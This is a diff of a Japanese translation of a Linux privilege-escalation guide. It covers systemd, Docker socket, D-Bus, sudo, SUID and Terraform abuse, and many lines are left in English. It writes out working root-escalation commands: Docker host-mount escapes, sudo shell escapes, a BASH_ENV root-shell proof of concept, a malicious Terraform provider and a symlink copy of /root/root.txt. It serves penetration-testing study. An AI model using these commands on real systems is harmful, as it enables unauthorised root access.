 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
@@ -474,87 +478,87 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### 書き込み可能な _.service_ ファイル
 
-任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能であれば、それを**変更する**ことで、サービスが**開始**、**再起動**、または**停止**されたときにあなたの**バックドアを実行**させることができます（場合によってはマシンの再起動を待つ必要があります）。\
-例えば `.service` ファイル内に **`ExecStart=/tmp/script.sh`** としてバックドアを作成します。
+任意の `.service` ファイルに書き込めるか確認してください。書き込める場合は、それを **修正して** サービスが **起動**、**再起動**、または **停止** されたときにあなたの **backdoor** を **実行** するようにできます（マシンの再起動を待つ必要があるかもしれません）。\\
+例えば、.service ファイル内にあなたの backdoor を作成し **`ExecStart=/tmp/script.sh`** と指定します。
 
 ### 書き込み可能なサービスバイナリ
 
-**サービスによって実行されるバイナリに対する書き込み権限がある**場合、それらをバックドアに置き換えることができ、サービスが再実行されたときにバックドアが実行されます。
+サービスによって実行されるバイナリに対して **書き込み権限がある場合**、それらを backdoors に差し替えることで、サービスが再実行された際に backdoors が実行される点に注意してください。
 
-### systemd PATH - 相対パス
+### systemd PATH - Relative Paths
 
-以下のコマンドで **systemd** が使用する PATH を確認できます:
+次のコマンドで **systemd** が使用する PATH を確認できます：
 ```bash
 systemctl show-environment
 ```
-パス内のいずれかのフォルダに**write**できることが判明した場合、**escalate privileges**できる可能性があります。次のような**relative paths being used on service configurations**が使われているファイルを探す必要があります:
+パス内のいずれかのフォルダに**書き込み**できることが分かった場合、**権限昇格**が可能になることがあります。以下のような、サービス設定ファイルで**相対パスが使用されている**箇所を検索する必要があります:
 ```bash
 ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと同じ名前の **executable** を作成します。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）の実行を求められると、あなたの **backdoor** が実行されます（通常、非特権ユーザはサービスを start/stop できませんが、`sudo -l` が使えるか確認してください）。
+次に、書き込み可能な systemd PATH フォルダ内に、相対パスバイナリと同じ名前の**executable**を作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの**backdoor will be executed**（通常、非特権ユーザはサービスを開始/停止できませんが、`sudo -l` が使えるか確認してください）。
 
-**サービスの詳細は `man systemd.service` を参照してください。**
+**サービスについて詳しくは `man systemd.service` を参照してください。**
 
-## **Timers**
+## **タイマー**
 
-**Timers** は名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントをネイティブにサポートし、非同期で実行できるため、cron の代替として利用できます。
+**タイマー**は名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。**タイマー**はカレンダー時間イベントやモノトニック時間イベントをネイティブでサポートしており、非同期で実行できるため、cron の代替として使用できます。
 
-すべての timers は次のコマンドで列挙できます:
+すべてのタイマーは次のコマンドで列挙できます：
 ```bash
 systemctl list-timers --all
 ```
 ### 書き込み可能なタイマー
 
-タイマーを変更できれば、systemd.unit（例えば `.service` や `.target`）のいくつかの既存ユニットを実行させることができます。
+タイマーを変更できるなら、systemd.unit の既存のエントリ (例: `.service` や `.target`) を実行させることができます。
 ```bash
 Unit=backdoor.service
 ```
 In the documentation you can read what the Unit is:
 
-> このタイマーが期限切れになったときにアクティブ化される Unit です。引数は、サフィックスが ".timer" ではない unit 名です。指定しない場合、この値はサフィックスを除いて timer unit と同じ名前の .service にデフォルトされます（上記参照）。アクティブ化される unit 名と timer unit の unit 名は、サフィックス以外は同一にすることが推奨されます。
+> タイマーが満了したときに有効化される unit を指定します。引数は unit 名で、そのサフィックスは ".timer" ではありません。指定しない場合、この値はタイマー unit と同じ名前（サフィックスを除く）を持つ service にデフォルトします（上記参照）。有効化される unit 名とタイマー unit の unit 名は、サフィックスを除いて同一にすることが推奨されます。
 
 Therefore, to abuse this permission you would need to:
 
-- systemd unit（例えば `.service`）で、**書き込み可能なバイナリを実行している**ものを見つける
-- **相対パスを実行している** systemd unit を見つけ、かつ **systemd PATH** に対して **書き込み権限** を持っている（その実行ファイルを偽装するため）
+- `.service` などの systemd unit のうち、**書き込み可能なバイナリを実行している**ものを見つける
+- **相対パスを実行している** systemd unit を見つけ、（その実行ファイルを偽装するために）**systemd PATH** に対して **書き込み権限** を持っていること
 
 **Learn more about timers with `man systemd.timer`.**
 
 ### **タイマーを有効化する**
 
-タイマーを有効化するには root 権限が必要で、以下を実行します：
+タイマーを有効化するには root 権限が必要で、次を実行します:
 ```bash
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
-Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+注意: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` に対するシンボリックリンクを作成することで**有効化**されます
 
-## Sockets
+## ソケット
 
-Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.
+Unix Domain Sockets (UDS) はクライアント-サーバモデルで同一マシンまたは別のマシン間の**プロセス間通信**を可能にします。これらはコンピュータ間通信のために標準の Unix ディスクリプタファイルを利用し、`.socket` ファイルを通じて設定されます。
 
-Sockets can be configured using `.socket` files.
+ソケットは `.socket` ファイルを使用して設定できます。
 
-**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:
+**`man systemd.socket` でソケットについて詳しく学べます。** このファイル内では、いくつかの興味深いパラメータを設定できます:
 
-- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
-- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
-- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
-- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
-- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.
+- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットがどこで**リッスンするかを示します**（AF_UNIX ソケットファイルのパス、リッスンする IPv4/6 やポート番号など）。
+- `Accept`: boolean 引数を取ります。**true** の場合、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。**false** の場合、すべての待ち受けソケット自体が**起動された service unit に渡され**、すべての接続に対して1つの service unit だけが生成されます。この値はデータグラムソケットや FIFO では無視され、単一の service unit が無条件にすべての着信トラフィックを処理します。**デフォルトは false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ作成することが推奨されます。
+- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、それらは待ち受けるソケット/FIFO がそれぞれ**作成されバインドされる前**または**作成されバインドされた後に**実行されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
+- `ExecStopPre`, `ExecStopPost`: 待ち受けるソケット/FIFO がそれぞれ**閉じられ削除される前**または**閉じられ削除された後に**実行される追加の**コマンド**です。
+- `Service`: **incoming traffic** に対して**activate**する `service` unit 名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトではソケットと同じ名前の service（サフィックスを置き換えたもの）になります。ほとんどの場合、このオプションを使う必要はありません。
 
-### Writable .socket files
+### 書き込み可能な .socket ファイル
 
-If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
-_Note that the system must be using that socket file configuration or the backdoor won't be executed_
+もし**書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**することができ、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があります。**\
+_そのソケットファイルの設定がシステムで実際に使用されていなければ、バックドアは実行されない点に注意してください_
 
-### Writable sockets
+### 書き込み可能なソケット
 
-If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.
+もし**書き込み可能なソケット**（ここで言うのは設定ファイルの `.socket` ではなく Unix ソケットのことです）を特定したら、そのソケットと**通信することができ**、脆弱性を悪用できる可能性があります。
 
-### Enumerate Unix Sockets
+### Unix ソケットの列挙
 ```bash
 netstat -a -p --unix
 ```
@@ -567,7 +571,7 @@ nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
 #apt-get install socat
 socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
 ```
-**悪用の例：**
+**Exploitation example:**
 
 
 {{#ref}}
@@ -576,48 +580,48 @@ socket-command-injection.md
 
 ### HTTP sockets
 
-一部に **sockets listening for HTTP** requests が存在する可能性があることに注意してください（_ここで言っているのは .socket files ではなく、unix sockets として動作するファイルです_）。次のコマンドで確認できます:
+注意: いくつかの **sockets listening for HTTP** requests が存在する場合があります（_.socket files のことではなく、unix sockets として動作するファイルのことを指します_）。次のコマンドで確認できます:
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
-もしソケットが **HTTP リクエストに応答する** なら、それと **通信** でき、場合によっては **脆弱性を悪用できる** かもしれません。
+ソケットが **responds with an HTTP** request の場合、それと **communicate** でき、場合によっては **exploit some vulnerability** することもあります。
 
 ### 書き込み可能な Docker Socket
 
-The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.
+The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. デフォルトでは、`root` ユーザーおよび `docker` グループのメンバーによって書き込み可能です。 このソケットへの書き込み権限を持つと、privilege escalation に繋がる可能性があります。 以下に、その実行方法の内訳と、Docker CLI が利用できない場合の代替手段を示します。
 
 #### **Privilege Escalation with Docker CLI**
 
-Docker ソケットへの書き込み権がある場合、次のコマンドを使用して権限を昇格できます:
+もし Docker socket への書き込み権がある場合、次のコマンドを使用して escalate privileges できます:
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
-これらのコマンドは、ホストのファイルシステムに対してrootレベルのアクセス権を持つcontainerを実行できるようにします。
+これらのコマンドにより、ホストのファイルシステムに対してrootレベルのアクセスを持つコンテナを実行できます。
 
 #### **Docker APIを直接使用する**
 
-Docker CLIが利用できない場合でも、Docker socketはDocker APIと`curl`コマンドを使って操作できます。
+Docker CLIが利用できない場合でも、DockerソケットはDocker APIと`curl`コマンドを使って操作できます。
 
-1.  **List Docker Images:** 利用可能なimagesの一覧を取得します。
+1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。
 
 ```bash
 curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
 
-2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするcontainerを作成するリクエストを送信します。
+2.  **Create a Container:** ホストのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。
 
 ```bash
 curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
 ```
 
-作成したcontainerを起動します:
+新しく作成したコンテナを起動する:
 
 ```bash
 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
 ```
 
-3.  **Attach to the Container:** `socat`を使ってcontainerへの接続を確立し、内部でコマンドを実行できるようにします。
+3.  **Attach to the Container:** `socat`を使ってコンテナに接続を確立し、その中でコマンドを実行できるようにします。
 
 ```bash
 socat - UNIX-CONNECT:/var/run/docker.sock
@@ -627,31 +631,31 @@ Connection: Upgrade
 Upgrade: tcp
 ```
 
-`socat`接続を設定した後は、ホストのファイルシステムに対してroot権限でcontainer内から直接コマンドを実行できます。
+`socat`接続を設定した後、ホストのファイルシステムに対するrootレベルのアクセス権でコンテナ内で直接コマンドを実行できます。
 
 ### その他
 
-docker socketに対して書き込み権限があり、**group `docker` のメンバー**である場合は[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。もし[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) なら、そちらも侵害できる可能性があります。
+docker socketに対して書き込み権限を持っている（**inside the group `docker`**）場合は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。もし[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)なら、それを悪用できる可能性もあります。
 
-以下で、dockerからの脱出や悪用による権限昇格の他の方法を確認してください:
+dockerからの脱出やそれを悪用してescalate privilegesする他の方法の詳細は、次を確認してください：
 
 
 {{#ref}}
 docker-security/
 {{#endref}}
 
-## Containerd (ctr) 権限昇格
+## Containerd (ctr) privilege escalation
 
-もし**`ctr`**コマンドを使用できることが分かった場合、次のページを読んでください。**権限昇格に悪用できる可能性があります**:
+If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
 
 {{#ref}}
 containerd-ctr-privilege-escalation.md
 {{#endref}}
 
-## **RunC** 権限昇格
+## **RunC** privilege escalation
 
-もし**`runc`**コマンドを使用できることが分かった場合、次のページを読んでください。**権限昇格に悪用できる可能性があります**:
+If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
 
 {{#ref}}
@@ -660,15 +664,15 @@ runc-privilege-escalation.md
 
 ## **D-Bus**
 
-D-Busは高度なプロセス間通信（inter-Process Communication, IPC）システムで、アプリケーション間の効率的な相互作用とデータ共有を可能にします。現代のLinuxシステム向けに設計されており、さまざまな形態のアプリケーション通信のための堅牢なフレームワークを提供します。
+D-Busは高度なインター・プロセス・コミュニケーション（IPC）システムであり、アプリケーションが効率的に相互作用しデータを共有できるようにします。現代のLinuxシステムを念頭に設計されており、様々な形態のアプリケーション間通信のための堅牢なフレームワークを提供します。
 
-このシステムは柔軟で、プロセス間のデータ交換を強化する基本的なIPC（拡張されたUNIXドメインソケットに類似）をサポートします。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetoothデーモンからの着信通知が音楽プレーヤーをミュートさせるといった動作が可能です。加えて、D-Busはリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。
+このシステムは多用途で、プロセス間のデータ交換を強化する基本的なIPCをサポートし、**enhanced UNIX domain sockets**を連想させます。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間の統合を容易にします。たとえば、Bluetoothデーモンからの着信通知のシグナルが音楽プレーヤーをミュートするよう促す、といったユーザー体験の向上が可能です。加えて、D-Busはリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。
 
-D-Busは許可/拒否モデル（allow/deny model）で動作し、ポリシー規則のマッチングの累積効果に基づいてメッセージ（メソッド呼び出し、シグナル送信など）の権限を管理します。これらのポリシーはバスとのやり取りを指定しており、権限の誤設定を悪用することで権限昇格につながる可能性があります。
+D-Busは**許可/拒否モデル**で動作し、マッチするポリシールールの累積効果に基づいてメッセージ権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとのインタラクションを指定し、これらの権限を悪用することでprivilege escalationを引き起こす可能性があります。
 
-例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーを示します。ここではrootユーザーが `fi.w1.wpa_supplicant1` を所有し、そのメッセージの送受信が許可される権限が記述されています。
+そのようなポリシーの例として、`/etc/dbus-1/system.d/wpa_supplicant.conf`にあるポリシーが示されており、rootユーザーが`fi.w1.wpa_supplicant1`を所有し、それへの送信および受信を行う権限が記載されています。
 
-ユーザーやグループが指定されていないポリシーは全体に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされないすべてに適用されます。
+ユーザーやグループが指定されていないポリシーは全体に適用され、"default"コンテキストのポリシーは他の特定のポリシーでカバーされない全てに適用されます。
 ```xml
 <policy user="root">
 <allow own="fi.w1.wpa_supplicant1"/>
@@ -677,7 +681,7 @@ D-Busは許可/拒否モデル（allow/deny model）で動作し、ポリシー�
 <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
 </policy>
 ```
-**ここで D-Bus 通信を enumerate して exploit する方法を学ぶ:**
+**ここで D-Bus 通信の enumerate と exploit の方法を学べます：**
 
 
 {{#ref}}
@@ -686,9 +690,9 @@ d-bus-enumeration-and-command-injection-privilege-escalation.md
 
 ## **ネットワーク**
 
-ネットワークを enumerate して、マシンの位置を特定することは常に有益です。
+ネットワークを enumerate して、マシンの位置を把握するのは常に興味深いです。
 
-### Generic enumeration
+### 一般的な enumeration
 ```bash
 #Hostname, hosts and DNS
 cat /etc/hostname /etc/hosts /etc/resolv.conf
@@ -711,16 +715,16 @@ cat /etc/networks
 #Files used by network services
 lsof -i
 ```
-### Open ports
+### 開いているポート
 
-常に、アクセスする前に操作できなかったマシンで動作している network services を確認してください:
+アクセスする前に相互作用できなかったマシン上で動作しているネットワークサービスは常に確認してください:
 ```bash
 (netstat -punta || ss --ntpu)
 (netstat -punta || ss --ntpu) | grep "127.0"
 ```
 ### Sniffing
 
-トラフィックをsniffできるか確認してください。もし可能なら、いくつかのcredentialsを入手できるかもしれません。
+sniff traffic が可能か確認してください。可能であれば、いくつかの credentials を取得できるかもしれません。
 ```
 timeout 1 tcpdump
 ```
@@ -728,7 +732,7 @@ timeout 1 tcpdump
 
 ### 一般的な列挙
 
-自分が**誰**か、どの**権限**を持っているか、システムにどの**ユーザー**がいるか、どのユーザーが**ログイン**できるか、どのユーザーが**root 権限**を持っているかを確認します:
+自分が誰（**who**）か、どのような**privileges**を持っているか、どの**users**がシステムに存在するか、どのアカウントが**login**できるか、どのアカウントが**root privileges**を持っているかを確認してください：
 ```bash
 #Info about me
 id || (whoami && groups) 2>/dev/null
@@ -752,21 +756,21 @@ gpg --list-keys 2>/dev/null
 ```
 ### Big UID
 
-一部の Linux バージョンには、**UID > INT_MAX** のユーザーが権限を昇格できるバグがありました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
-実行例: **`systemd-run -t /bin/bash`**
+一部の Linux バージョンは、**UID > INT_MAX** のユーザーが escalate privileges できるバグの影響を受けました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh), [here](https://twitter.com/paragonsec/status/1071152249529884674).\
+**Exploit it** using: **`systemd-run -t /bin/bash`**
 
-### グループ
+### Groups
 
-root 権限を与える可能性のある**グループのメンバー**かどうかを確認してください:
+root privileges を付与する可能性のあるグループの**メンバー**であるかどうか確認してください:
 
 
 {{#ref}}
 interesting-groups-linux-pe/
 {{#endref}}
 
-### クリップボード
+### Clipboard
 
-可能であれば、クリップボード内に興味深い内容がないか確認してください
+可能であれば、クリップボードの中に興味深いものが含まれていないか確認してください
 ```bash
 if [ `which xclip 2>/dev/null` ]; then
 echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
@@ -781,29 +785,29 @@ fi
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
-### Known passwords
+### 既知のパスワード
 
-環境の**パスワードを知っている場合**は、そのパスワードを使って**各ユーザーにログインを試みてください**。
+環境のパスワードを1つでも知っている場合は、そのパスワードを使って各ユーザーにログインしてみてください。
 
 ### Su Brute
 
-大量のノイズを出しても構わず、`su` と `timeout` バイナリが対象マシンに存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーに対して brute-force を試みることができます。\
-[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーの brute-force も試みます。
+多くのノイズが出ることを気にしない場合で、対象のマシンに `su` と `timeout` バイナリが存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
+[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーを brute-force しようとします。
 
 ## Writable PATH abuses
 
 ### $PATH
 
-もし $PATH のあるフォルダに**書き込みできる**ことが分かった場合、別のユーザー（理想的には root）が実行するコマンドと同じ名前で、かつ $PATH 上であなたの書き込み可能なフォルダより前にあるフォルダからロードされないコマンド名を使って、書き込み可能なフォルダ内に **backdoor を作成する**ことで権限昇格できる可能性があります。
+$PATH のいずれかのフォルダに書き込みできることが判明した場合、書き込み可能なフォルダ内に、別のユーザー（理想は root）が実行するコマンド名と同じ名前の backdoor を作成することで権限昇格できる可能性があります。ただし、そのコマンドが $PATH 上であなたの書き込み可能フォルダより前にあるフォルダから読み込まれないことが条件です。
 
 ### SUDO and SUID
 
-sudo を使ってコマンドを実行できる、あるいは suid ビットが設定されているコマンドがあるかもしれません。以下で確認してください：
+sudo を使って実行できるコマンドが許可されている場合や、バイナリに suid ビットが設定されている場合があります。以下で確認してください：
 ```bash
 sudo -l #Check commands you can execute with sudo
 find / -perm -4000 2>/dev/null #Find all SUID binaries
 ```
-いくつかの**予期しないコマンドは、ファイルの読み取りや書き込み、さらにはコマンドの実行を可能にします。**例えば：
+一部の**予期しない commands はファイルの読み取りおよび/または書き込み、あるいは command の実行さえ可能にします。** 例えば:
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find /etc -exec sh -i \;
@@ -814,37 +818,37 @@ less>! <shell_comand>
 ```
 ### NOPASSWD
 
-Sudo の設定により、ユーザーはパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
+Sudo の設定により、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
 ```
 $ sudo -l
 User demo may run the following commands on crashlab:
 (root) NOPASSWD: /usr/bin/vim
 ```
-この例では、ユーザー `demo` が `root` として `vim` を実行できます。`root` ディレクトリに ssh key を追加するか、`sh` を呼び出すだけで shell を取得するのは容易です。
+この例では、ユーザー`demo`が`root`として`vim`を実行できます。root directoryにssh keyを追加するか、`sh`を呼び出すことでshellを取得するのは簡単です。
 ```
 sudo vim -c '!sh'
 ```
 ### SETENV
 
-このディレクティブは、ユーザーが実行時に**環境変数を設定する**ことを許可します:
+このディレクティブは、何かを実行する際にユーザーが**環境変数を設定できる**ようにします:
 ```bash
 $ sudo -l
 User waldo may run the following commands on admirer:
 (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
-この例は、**based on HTB machine Admirer** に基づいており、スクリプトを root として実行する際に任意の python ライブラリをロードするための **PYTHONPATH hijacking** に**vulnerable**でした:
+この例は、**HTB machine Admirer を基にした**もので、スクリプトを root として実行する際に任意の python ライブラリを読み込める **PYTHONPATH hijacking** に **vulnerable** でした:
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
-### BASH_ENV preserved via sudo env_keep → root shell
+### BASH_ENV が sudo env_keep によって保持されると → root shell
 
-If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.
+もし sudoers が `BASH_ENV` を保持している場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可されたコマンドを呼び出したときに Bash の非対話的な起動挙動を利用して任意のコードを root として実行できます。
 
-- 仕組み: 非対話型シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。sudo によって `BASH_ENV` が保持されていると、あなたのファイルは root 権限で source されます。
+- なぜ機能するか: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source（読み込み）します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。sudo が `BASH_ENV` を保持している場合、あなたのファイルは root 権限で source されます。
 
 - 要件:
 - 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
-- `env_keep` に `BASH_ENV` が存在すること（`sudo -l` で確認）。
+- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。
 
 - PoC:
 ```bash
@@ -856,16 +860,16 @@ chmod +x /dev/shm/shell.sh
 BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
 # You should now have a root shell
 ```
-- ハードニング:
-- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を優先する。
-- sudo で許可されたコマンドのためのシェルラッパーを避け、最小限のバイナリを使用する。
-- 保持された環境変数が使用された場合、sudo の入出力ログおよびアラートを検討する。
+- Hardening:
+- Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
+- Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
+- Consider sudo I/O logging and alerting when preserved env vars are used.
 
-### Terraform を sudo 経由で HOME が保持された状態 (!env_reset)
+### Terraform via sudo with preserved HOME (!env_reset)
 
-sudo が環境をそのままにして（`!env_reset`）`terraform apply` を許可すると、`$HOME` は呼び出しユーザのままになる。したがって Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を尊重する。
+If sudo leaves the environment intact (`!env_reset`) while allowing `terraform apply`, `$HOME` stays as the calling user. Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.
 
-- 必要な provider を書き込み可能なディレクトリに向け、プロバイダ名を付けた悪意あるプラグイン（例: `terraform-provider-examples`）を置く:
+- Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
 ```hcl
 # ~/.terraformrc
 provider_installation {
@@ -886,24 +890,32 @@ EOF
 chmod +x /dev/shm/terraform-provider-examples
 sudo /usr/bin/terraform -chdir=/opt/examples apply
 ```
-Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root 権限で実行し、SUID shell を残します。
+Terraform will fail the Go plugin handshake but executes the payload as root before dying, leaving a SUID shell behind.
 
 ### TF_VAR overrides + symlink validation bypass
 
-Terraform の変数は `TF_VAR_<name>` 環境変数を通じて指定できます。これらは sudo が環境を保持する場合に引き継がれます。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い検証は symlink を使って bypass できます:
+Terraformの変数は`TF_VAR_<name>`環境変数で渡すことができ、sudoが環境を保持する場合にはそのまま残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`のような弱い検証はシンボリックリンクでバイパスできます：
 ```bash
 mkdir -p /dev/shm/root/examples
 ln -s /root/root.txt /dev/shm/root/examples/flag
 TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
 cat /home/$USER/docker/previous/public/examples/flag
 ```
-Terraformはシンボリックリンクを解決して実際の`/root/root.txt`を攻撃者が読める場所へコピーします。同じ手法は、宛先のシンボリックリンクを事前に作成しておくことで、特権パスへ**書き込む**ためにも利用できます（例：プロバイダの宛先パスを`/etc/cron.d/`内に向ける）。
+Terraform はシンボリックリンクを解決し、実際の `/root/root.txt` を攻撃者が読める先にコピーします。同じ手法は、宛先シンボリックリンクを事前に作成することで特権パスへの**書き込み**にも利用できます（例: プロバイダの宛先パスを `/etc/cron.d/` 内に向けるなど）。
+
+### requiretty / !requiretty
+
+一部の古いディストリビューションでは、sudo は `requiretty` で設定でき、これは sudo を対話的な TTY からのみ実行するように強制します。`!requiretty` が設定されている（またはオプションが存在しない）場合、sudo は reverse shells、cron jobs、または scripts のような非対話的コンテキストから実行できます。
+```bash
+Defaults !requiretty
+```
+これは単独では直接的な脆弱性ではありませんが、sudo ルールがフル PTY を必要とせずに悪用されうる状況を拡大します。
 
 ### Sudo env_keep+=PATH / insecure secure_path → PATH hijack
 
-`sudo -l`の出力に`env_keep+=PATH`が含まれている、または攻撃者が書き込み可能なエントリ（例：`/home/<user>/bin`）を含む`secure_path`が設定されている場合、sudoで許可されたターゲット内の相対コマンドは上書き（shadowed）され得ます。
